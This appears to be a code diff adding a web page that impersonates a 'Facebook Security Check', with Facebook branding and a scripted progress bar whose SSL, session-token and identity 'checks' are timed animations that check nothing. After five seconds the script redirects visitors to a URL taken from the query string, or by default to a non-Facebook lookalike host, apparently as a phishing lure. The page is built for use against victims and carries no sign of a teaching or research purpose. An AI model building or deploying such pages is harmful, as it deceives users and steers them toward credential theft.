@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <title>Facebook Security Check</title>
+  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .check-card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 24px rgba(0,0,0,.12);
+      padding: 48px 40px;
+      max-width: 420px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .fb-logo {
+      color: #1877f2;
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 28px;
+      font-family: Klavika-Medium, sans-serif;
+      letter-spacing: -1px;
+    }
+
+    .shield-wrap {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 24px;
+    }
+
+    .shield-wrap svg.shield-bg {
+      width: 80px;
+      height: 80px;
+    }
+
+    .spinner-ring {
+      position: absolute;
+      top: -8px;
+      left: -8px;
+      width: 96px;
+      height: 96px;
+      border: 3px solid #e7f0fd;
+      border-top: 3px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0%   { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1c1e21;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #65676b;
+      line-height: 1.5;
+      margin-bottom: 28px;
+    }
+
+    .progress-track {
+      background: #e4e6ea;
+      border-radius: 10px;
+      height: 6px;
+      overflow: hidden;
+      margin-bottom: 12px;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: #1877f2;
+      border-radius: 10px;
+      width: 0%;
+      transition: width 0.4s ease;
+    }
+
+    .status-text {
+      font-size: 13px;
+      color: #65676b;
+      margin-bottom: 28px;
+    }
+
+    .checks {
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .check-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: #65676b;
+    }
+
+    .check-icon {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 2px solid #dddfe2;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+
+    .check-icon.done {
+      background: #1877f2;
+      border-color: #1877f2;
+    }
+
+    .check-icon.done svg {
+      display: block;
+    }
+
+    .check-icon svg {
+      display: none;
+      width: 11px;
+      height: 11px;
+    }
+
+    .check-label {
+      transition: color 0.3s ease;
+    }
+
+    .check-label.done {
+      color: #1c1e21;
+      font-weight: 500;
+    }
+
+    .notice {
+      margin-top: 28px;
+      padding: 12px 14px;
+      background: #e3f2fd;
+      border-radius: 8px;
+      border-left: 4px solid #1877f2;
+      font-size: 12px;
+      color: #1c1e21;
+      text-align: left;
+      line-height: 1.5;
+    }
+
+    .notice strong {
+      color: #1877f2;
+    }
+  </style>
+</head>
+<body>
+  <div class="check-card">
+    <div class="fb-logo">facebook</div>
+
+    <div class="shield-wrap">
+      <div class="spinner-ring"></div>
+      <svg class="shield-bg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#1877f2" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="#e3f2fd"/>
+        <path d="M9 12L11 14L16 9" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <h2 class="title">Checking Your Connection</h2>
+    <p class="subtitle">Please wait while we perform a quick security check to ensure your connection is safe and secure.</p>
+
+    <div class="progress-track">
+      <div class="progress-fill" id="progress-fill"></div>
+    </div>
+    <p class="status-text" id="status-text">Initializing security check...</p>
+
+    <div class="checks">
+      <div class="check-item">
+        <div class="check-icon" id="check-1">
+          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <span class="check-label" id="label-1">Verifying SSL certificate</span>
+      </div>
+      <div class="check-item">
+        <div class="check-icon" id="check-2">
+          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <span class="check-label" id="label-2">Checking network security</span>
+      </div>
+      <div class="check-item">
+        <div class="check-icon" id="check-3">
+          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <span class="check-label" id="label-3">Validating session token</span>
+      </div>
+      <div class="check-item">
+        <div class="check-icon" id="check-4">
+          <svg viewBox="0 0 12 12" fill="none"><polyline points="2,6 5,9 10,3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <span class="check-label" id="label-4">Confirming identity</span>
+      </div>
+    </div>
+
+    <div class="notice">
+      <strong>Security Notice:</strong> Do not close or refresh this page. You will be redirected automatically once the check is complete.
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const dest = params.get('url') || 'https://facebook-trustedcc.onrender.com';
+
+      const totalMs = 5000;
+      const fill = document.getElementById('progress-fill');
+      const statusText = document.getElementById('status-text');
+
+      const steps = [
+        { at: 800,  checkId: 'check-1', labelId: 'label-1', status: 'Checking network security...' },
+        { at: 2000, checkId: 'check-2', labelId: 'label-2', status: 'Validating session token...' },
+        { at: 3400, checkId: 'check-3', labelId: 'label-3', status: 'Confirming identity...' },
+        { at: 4400, checkId: 'check-4', labelId: 'label-4', status: 'Connection verified. Redirecting...' },
+      ];
+
+      const start = Date.now();
+
+      function tick() {
+        const elapsed = Date.now() - start;
+        const pct = Math.min((elapsed / totalMs) * 100, 100);
+        fill.style.width = pct + '%';
+
+        if (elapsed >= totalMs) {
+          fill.style.width = '100%';
+          window.location.href = dest;
+          return;
+        }
+
+        requestAnimationFrame(tick);
+      }
+
+      steps.forEach(function (step) {
+        setTimeout(function () {
+          const icon = document.getElementById(step.checkId);
+          const label = document.getElementById(step.labelId);
+          icon.classList.add('done');
+          label.classList.add('done');
+          statusText.textContent = step.status;
+        }, step.at);
+      });
+
+      requestAnimationFrame(tick);
+    })();
+  </script>
+</body>
+</html>
